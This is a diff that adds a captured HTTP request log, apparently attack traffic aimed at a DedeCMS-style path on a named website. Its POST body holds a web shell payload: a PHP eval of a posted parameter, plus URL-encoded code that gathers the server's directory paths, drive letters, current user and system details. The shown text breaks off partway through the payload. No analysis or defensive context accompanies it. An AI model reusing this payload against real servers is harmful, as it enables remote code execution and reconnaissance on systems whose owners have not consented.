@@ -1,0 +1,12 @@
+-------LOG_admin_20181126102703_ok.csv-------
+POST /plus/mytag_js.php?aid=9090 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Language: zh-cn
+Referer: http://www.koreapas.net/1.php
+User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
+Content-Length: 1503
+Host: www.koreapas.net
+
+php=@eval(get_magic_quotes_gpc()?stripslashes($_POST[chr(122).chr(48)]):$_POST[chr(122).chr(48)]);&z0=603403%3b%40ini_set(%22display_errors%22%2c%220%22)%3b%40set_time_limit(0)%3b%40set_magic_quotes_runtime(0)%3becho(%22-%3e%7c%22)%3b%3b%24D%3ddirname(%24_SERVER%5b%22SCRIPT_FILENAME%22%5d)%3bif(%24D%3d%3d%22%22)%24D%3ddirname(%24_SERVER%5b%22PATH_TRANSLATED%22%5d)%3b%24root%3disset(%24_SERVER%5b%27DOCUMENT_ROOT%27%5d)%3f%24_SERVER%5b%27DOCUMENT_ROOT%27%5d%3a(isset(%24_SERVER%5b%27APPL_PHYSICAL_PATH%27%5d)%3ftrim(%24_SERVER%5b%27APPL_PHYSICAL_PATH%27%5d%2c%22%5c%5c%22)%3a(isset(%24_%5b%27PATH_TRANSLATED%27%5d)%3fstr_replace(%24_SERVER%5b%22PHP_SELF%22%5d)%3astr_replace(str_replace(%22%2f%22%2c%22%5c%5c%22%2cisset(%24_SERVER%5b%22PHP_SELF%22%5d)%3f%24_SERVER%5b%22PHP_SELF%22%5d%3a(isset(%24_SERVER%5b%22URL%22%5d)%3f%24_SERVER%5b%22URL%22%5d%3a%24_SERVER%5b%22SCRIPT_NAME%22%5d))%2c%22%22%2cisset(%24_SERVER%5b%22PATH_TRANSLATED%22%5d)%3f%24_SERVER%5b%22PATH_TRANSLATED%22%5d%3a%24_SERVER%5b%22SCRIPT_FILENAME%22%5d)))%3b%24R%3d%22%7b%24D%7d%7c%22.%24root.%22%7c%22%3bif(substr(%24D%2c0%2c1)!%3d%22%2f%22)%7bforeach(range(%22A%22%2c%22Z%22)+as+%24L)if(is_dir(%22%7b%24L%7d%3a%22))%24R.%3d%22%7b%24L%7d%3a%22%3b%7d%24R.%3d%22%7c%22%3b%24u%3d(function_exists(%27posix_getegid%27))%3f%40posix_getpwuid(%40posix_geteuid())%3a%27%27%3b%24usr%3d(%24u)%3f%24u%5b%27name%27%5d%3a%40get_current_user()%3b%24R.%3dphp_uname()%3b%24R.%3d%22(%7b%24
